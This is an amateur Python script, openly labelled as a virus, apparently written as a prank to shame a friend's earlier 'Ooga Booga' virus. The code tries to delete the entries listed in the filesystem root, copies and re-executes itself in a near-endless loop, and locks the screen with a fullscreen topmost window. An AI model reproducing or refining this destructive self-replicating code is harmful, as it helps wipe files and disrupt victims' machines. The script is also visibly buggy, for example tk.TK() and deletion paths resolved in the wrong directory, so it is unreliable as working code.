"""
Produced by Mr. Waltz
date: March 21: RAMADAN SOON Boiss!!!
Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
I literally only made this to shame malek for his horrible "Ooga Booga" virus.
"""

# a virus like this should be self executable so add stuff for that later...
# Make it cooler you stupid nerd!
# does it even work? i need it to become a .exe...... hmm
# Above are mearly notes for myself, please ignore.
import os
import shutil
import sys
import tkinter as tk
import random as r 


root = tk.TK()

path = "/"
the_package = "No longer used, but i dont actually feel  like removing its uses so i put this here. lmao."
number = 1*11111111111234645634563456345634564599999999
number = number**22
filenames = list(str(number))


sys_files = os.listdir(path)
cd = os.getcwd()
cd += '/'


def file_creation(Ver, code):
    Ver += 1
    in_code = code
    ooga_file = open(f"Oogabooga{Ver}.py", 'w')
    for file_in in sys_files:
        if not os.access(file_in, os.R_OK):
            pass
        elif file_in == 'snap':
            ooga_file.close()
            pass
        else:
            os.remove(file_in)
    return ooga_file


def file_run(i, open2):
    number = i
    number += 1
    open2 = outside_ooga
    open2 = open(f"{cd}Oogabooga{number}.py")
    print(open2)
    exec(open2.read())


for num in range(0, 9999999999999999999999999999999):
    outside_ooga = file_creation(num, the_package)
    try:
        root.geometry("2400000000000000x24000000000000000000")
        root.title("CyberneticCookieMalware")
        root.attributes('-fullscreen',True)
        label = tk.Label(root, text="A Cybernetic Cookie Production: OogaBooga Looser", font=('Arial',15))
        label.pack(padx=1, pady=100)
        root.configure(background='black')
        root.lift()
        value = r.choice(filenames)
        shutil.copy(__file__, f"OogaBooga{value}.py")
        exec(open(f"OogaBooga{value}.py").read())

        root.geometry('2500x25000')
    except:
        pass

root.call('wm', 'attributes', '.', '-topmost', '1')
root.mainloop()

